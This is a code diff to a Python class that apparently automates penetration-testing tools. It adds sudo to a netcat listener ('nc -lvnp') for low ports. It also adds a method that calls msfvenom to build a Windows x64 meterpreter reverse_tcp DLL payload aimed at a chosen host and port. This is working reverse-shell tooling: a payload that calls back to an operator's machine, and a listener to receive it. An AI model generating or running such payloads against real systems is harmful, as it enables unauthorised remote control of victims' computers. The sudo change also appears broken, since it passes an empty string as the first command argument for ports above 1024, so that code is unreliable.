@@ -34,8 +34,12 @@ class ToolService:
         path = self.utils.create_service_folder('tool/nc')
         self.utils.logging.debug(f'new folder created:: {path}')
 
+        use_sudo = ""
+        if port <= 1024:
+            use_sudo = "sudo"
+
         cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
-            ['nc', '-lvnp', port],
+            [use_sudo, 'nc', '-lvnp', str(port)],
             ['tee', f'{path}/nc.log']
         ])
 
@@ -44,3 +48,23 @@ class ToolService:
     #
     #
     # --------------------------------------------------------------------------
+
+    def msfvenom(self, host: str, port: int):
+        self.utils.log_runBanner('MSFVENOM')
+        path = self.utils.create_service_folder('tool/msfvenom')
+        self.utils.logging.debug(f'new folder created:: {path}')
+
+        # reverse_type = "windows/meterpreter/reverse_tcp"
+        # reverse_options = ['-ax86', '-f', 'dll']
+        # reverse_end = 'dll'
+
+        reverse_type = "windows/x64/meterpreter/reverse_tcp"
+        reverse_options = ['-ax64', '-f', 'dll']
+        reverse_end = 'dll'
+
+        cmd_result = self.utils.run_command_output_loop(f'nc listening...', [
+            ['msfvenom', '-p', reverse_type, f'LHOST={host}', f'LPORT={port}', '-o', f'{path}/reverse_shell.{reverse_end}'] + reverse_options
+        ])
+
+        # with open(f'{path}/reverse_shell.{reverse_end}', 'r') as file:
+        #     file.write(cmd_result)
